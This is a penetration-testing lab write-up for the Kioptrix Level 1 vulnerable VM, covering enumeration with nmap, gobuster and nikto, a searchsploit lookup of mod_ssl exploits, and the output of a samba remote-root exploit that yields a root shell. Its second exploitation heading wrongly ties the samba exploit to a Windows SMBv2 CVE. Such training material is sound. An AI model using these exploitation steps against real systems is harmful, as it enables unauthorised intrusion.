# Kioptrix Level 1

## Enumeration

- Port scan

```
# tcp scan
nmap -sT 192.168.1.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 16:13 CEST
Nmap scan report for Host-006.homenet.telecomitalia.it (192.168.1.104)
Host is up (0.011s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm

# scan -sC
nmap -sC 192.168.1.104                                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 16:10 CEST
Nmap scan report for Host-006.homenet.telecomitalia.it (192.168.1.104)
Host is up (0.0100s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn
443/tcp  open  https
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_ssl-date: 2024-08-20T20:10:18+00:00; +5h59m55s from scanner time.
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status

Host script results:
|_clock-skew: 5h59m54s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
```

- enum4linux: no rilevant information

```
nmap -sC --script vuln 192.168.1.104
[...]
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
```

## Apache tcp\80,443

Default page available on TCP port 80.

## Directory Discovery

- Gobuster dir discovery

```
gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 304]
/.htpasswd            (Status: 403) [Size: 304]
/~operator            (Status: 403) [Size: 304]
/~root                (Status: 403) [Size: 300]
/cgi-bin/             (Status: 403) [Size: 303]
/index.html           (Status: 200) [Size: 2890]
/manual               (Status: 301) [Size: 356] [--> http://kioptrix.level1.homenet.xxx/manual/]
/mrtg                 (Status: 301) [Size: 354] [--> http://kioptrix.level1.homenet.xxx/mrtg/]
/usage                (Status: 301) [Size: 355] [--> http://kioptrix.level1.homenet.xxx/usage/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

- MRTG web app discovered

![MRTG](https://github.com/roccosicilia/SecurityBlueprints/blob/main/Writeups/static/kioptrix-mrtg-homepage.png?raw=true "MRTG")

- Check for MRTG content:
 - /mrtg: homepage
 - /manual: index of /manual with Apache version reported (1.3.20)
 - /usage: usage statistics

## Nikto vuln scan

- Scan for /mrtg and /usage:
 - CVE-2003-1418 found: allows remote attackers to obtain sensitive information
 - No CGI dir found
 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell

- Search for public exploit:

```
searchsploit mod_ssl   
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Service                                                            | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                 | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                       | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                 | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                 | unix/remote/47080.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow               | unix/remote/40347.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Exploitation 1: OpenFuckV2

 - Compile unix/remote/47080.c
 - Exploit apache on port 443
 - Obtain a shell: user apache

## Explotation 2: smb-vuln-cve2009-3103

```
./smbexp -b 0 -v 192.168.1.104        
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Using ret: [0xbffffa24]
+ Using ret: [0xbffff8f8]
+ Using ret: [0xbffff7cc]
+ Using ret: [0xbffff6a0]
+ Using ret: [0xbffff574]
+ Using ret: [0xbffff448]
+ Using ret: [0xbffff31c]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```